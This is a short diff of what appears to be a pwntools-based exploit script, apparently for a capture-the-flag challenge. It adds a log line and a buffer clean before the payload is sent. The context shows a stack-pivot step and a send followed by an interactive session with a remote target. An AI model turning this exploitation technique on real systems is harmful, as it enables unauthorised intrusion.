@@ -82,5 +82,7 @@ if __name__ == "__main__":
     op += movb_r15(offset)                        # stack pivot
     op += assemble('add rsp, r15')
     
+    log.info("sending %d bytes..." % len(op))
     r.send(op)
+    r.clean()
     r.interactive()
